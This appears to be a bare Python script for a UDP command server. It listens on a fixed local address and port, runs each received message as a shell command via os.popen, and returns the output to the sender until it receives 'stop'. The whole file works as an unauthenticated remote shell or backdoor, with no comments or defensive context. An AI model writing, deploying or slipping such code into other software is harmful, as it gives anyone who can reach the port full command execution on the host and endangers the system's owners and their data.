import socket
import os

s = socket.socket(socket.AF_INET,socket.SOCK_DGRAM)

host = '192.168.1.2'
port = 4952

s.bind((host,port))

print(s.recvfrom(1024)[0].decode('utf-8'))

while(True):
    x = s.recvfrom(1024)
    if(x[0].decode()=='stop'):
        break
    ops = os.popen(x[0].decode())
    op = ops.read()
    print(op)
    s.sendto(op.encode(),x[1])